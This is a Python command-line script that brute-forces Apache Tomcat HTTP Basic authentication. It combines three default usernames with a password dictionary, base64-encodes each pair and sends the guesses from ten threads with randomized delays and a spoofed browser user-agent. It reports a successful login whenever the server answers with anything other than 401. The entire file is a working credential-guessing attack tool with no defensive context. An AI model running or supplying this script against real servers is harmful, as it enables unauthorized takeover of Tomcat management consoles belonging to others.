#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import base64
import sys
import queue
import threading
import time
import random
import argparse


password_base64 = queue.Queue()
count = 10

#PROXS = {'http': '127.0.0.1:8080'}
def get_cheek_pass(url,dict):
    username = ["tomcat","admin","Tomcat"]
    for name in username:
        with open(dict, "r", encoding='ISO-8859-1') as f:
            for password in f:
                pass_str = name.strip() + ":" + password.strip()
                base64_str = base64.b64encode(pass_str.encode('utf-8')).decode("utf-8")
                password_base64.put(base64_str)
    thread = []
    print("use %d threading"%(count))
    print("[+] --- startig tomcat cheek ---")
    for i in range(count):
        t = threading.Thread(target=cheek_tomcat,args=(url,))
        t.start()
        thread.append(t)
    for th in thread:
        th.join()
def cheek_tomcat(url):
    con = password_base64.qsize()
    while con >0:
        basic = password_base64.get()
        time.sleep(random.randint(1,4))
        headers = {
            "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Content-Type": "application/x-www-form-urlencoded",
            'Authorization': 'Basic %s' % basic
        }
        try:
            #req = requests.get(url, headers=headers,proxies=PROXS,timeout=5)
            req = requests.get(url, headers=headers,timeout=5)
            if req.status_code != 401:
                print("[+] status_code:", req.status_code, "tomcat爆破成功:",
                base64.b64decode(basic.encode("utf-8")).decode("utf-8"))
                if input("Good luck ! Please input [eixt] to out! :").strip() == "exit":
                    exit(0)
            else:
                print("[-] status_code:", req.status_code, "error:",
                      base64.b64decode(basic.encode("utf-8")).decode("utf-8"))
        except:
            pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', type=str, help='tomcat url Target')
    parser.add_argument('-p', type=str, help='password file')
    args = vars(parser.parse_args())
    url = args.t
    dict = args.p
    get_cheek_pass(url,dict)
    if input("Error boom!!!! Please input [eixt] to out! :").strip() == "exit":
        exit(0)
